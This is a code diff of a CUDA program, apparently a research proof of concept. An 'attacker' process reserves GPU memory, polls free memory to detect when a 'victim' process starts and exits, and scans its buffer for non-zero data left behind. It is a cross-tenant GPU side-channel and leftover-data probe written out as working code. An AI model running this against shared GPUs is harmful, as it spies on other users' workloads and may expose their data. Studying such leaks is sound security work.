@@ -79,72 +79,73 @@ int main() {
   size_t total_memsize, available_memsize;
 
   cudaMemGetInfo(&available_memsize, &total_memsize);
+
+  size_t memsize = available_memsize - (65273856 * 4);
+
+  size_t num_elements = memsize / 4;
+  std::cout << "Number of elements in a: " << num_elements << "\n";
+
+  uint32_t *h_a = (uint32_t*)malloc(memsize);
+  uint32_t *d_a;
+  cuda_try(cudaMalloc(&d_a, memsize));
+  std::cout << "Allocating: " << memsize << ", " << memsize / 1048576.0f << " MBytes\n"; 
+
+  cuda_try(cudaMemset(d_a, 0, memsize));
+
+  // Update available_memsize after allocation
+  cudaMemGetInfo(&available_memsize, &total_memsize);
   size_t attacker_base_usage = total_memsize - available_memsize;
   std::cout << "Attacker base memory usage: " << attacker_base_usage << ", " << attacker_base_usage / 1048576.0f << " MBytes \n";
   std::cout << "Available Memory: " << available_memsize << ", " << available_memsize / 1048576.0f << " MBytes\n"; 
 
-  //size_t num_elements = 262144;
-  //size_t memsize = num_elements * sizeof(uint32_t);
-  size_t memsize = total_memsize;
-  size_t num_elements = memsize / 4;
+  size_t victim_usage = 0;
 
-  std::cout << "Number of elements in a: " << num_elements << "\n";
+  // Victim Detection System
+  while (true) {
+    // Based on available global memory in GPU, determine if victim has allocated memory in GPU
+    cudaMemGetInfo(&available_memsize, &total_memsize);
+    std::cout << "Available Memory: " << available_memsize << ", " << available_memsize / 1048576.0f << " MBytes"; 
 
-  uint32_t *a;
-  cuda_try(cudaMallocManaged(&a, total_memsize));
-  std::cout << "Allocating: " << total_memsize << ", " << total_memsize / 1048576.0f << " MBytes\n"; 
+    if(available_memsize + attacker_base_usage != total_memsize) {
+      victim_usage = total_memsize - attacker_base_usage - available_memsize;
+      std::cout << " <-- Victim is here!\n";
+      break;
+    }
+    std::cout << "\n";
+    usleep(100000); // 0.1 seconds
+  }
 
-  for (size_t i = 0; i < num_elements; i++) {
-    a[i] = i;
-	} 
+  // Victim Exit System
+  while (true) {
+    // Based on available global memory in GPU, determine if victim has finished using memory in GPU
+    cudaMemGetInfo(&available_memsize, &total_memsize);
+    std::cout << "Available Memory: " << available_memsize << ", " << available_memsize / 1048576.0f << " MBytes"; 
 
-  int num_threads = 1024;
-  size_t num_blocks = num_elements / num_threads;
+    if (total_memsize - attacker_base_usage - available_memsize > victim_usage) {
+      victim_usage = total_memsize - attacker_base_usage - available_memsize;
+    }
 
-  std::cout << "Launching GPU kernel (transferMem)\n";
-  transferMem<<<num_blocks, num_threads>>>(a, num_elements);
+    if(available_memsize + attacker_base_usage == total_memsize) {
+      std::cout << " <-- Victim is gone!\n";
+      std::cout << "  Victim Maximum Memory Usage: " << victim_usage << ", " << victim_usage / 1048576.0f << " MBytes\n"; 
+      break;
+    }
+    std::cout << "\n";
 
-  cudaDeviceSynchronize();
-  usleep(10000000);
-  //cudaFree(&a);
-  /*cudaMemGetInfo(&available_memsize, &total_memsize);
-  std::cout << "Available Memory: " << available_memsize << ", " << available_memsize / 1048576.0f << " MBytes\n"; 
-
-  unsigned int *d_a;
-  cuda_try(cudaMalloc(&d_a, memsize));
-  cudaMemGetInfo(&available_memsize, &total_memsize);
-  std::cout << "Available Memory: " << available_memsize << ", " << available_memsize / 1048576.0f << " MBytes\n"; 
-
-  uint32_t *h_a;
-  h_a = (uint32_t*)malloc(memsize);
-  cuda_try(cudaMemcpy(h_a, d_a, memsize, cudaMemcpyDeviceToHost));
-
-  cudaMemGetInfo(&available_memsize, &total_memsize);
-  std::cout << "Available Memory: " << available_memsize << ", " << available_memsize / 1048576.0f << " MBytes\n"; */
-
-  /*uint32_t *h_a;
-  cuda_try(cudaMallocManaged(&h_a, memsize));
-  cudaMemPrefetchAsync(&h_a, memsize, cudaCpuDeviceId);
-
-  size_t num_uncleared = 0;
-  size_t num_zero = 0;
-  size_t num_others = 0;
-
-  for (size_t i = 0; i < memsize / 4; i+= 32) {
-    for (size_t j = 0; j < 32; ++j) {
-			if(h_a[i+j] == uniq_key[j] + 1) {
-        num_uncleared++;
-      }
-      else if(h_a[i+j] == 0) {
+    cuda_try(cudaMemcpy(h_a, d_a, memsize, cudaMemcpyDeviceToHost));
+    size_t num_zero = 0;
+    size_t num_others = 0;
+    for (size_t i = 0; i < num_elements; i++) {
+      if(h_a[i] == 0) {
         num_zero++;
       }
       else {
         num_others++;
       }
-		}
-  }
+	  }  
+    std::cout << "Number of zeros: " << num_zero << "\n";
+    std::cout << "Number of others: " << num_others << "\n";   
 
-    std::cout << "Number of uncleared memory: " << num_uncleared << "\n";
-  std::cout << "Number of zeros: " << num_zero << "\n";
-  std::cout << "Number of others: " << num_others << "\n";*/
+    usleep(100000); // 0.1 seconds
+  }
 }
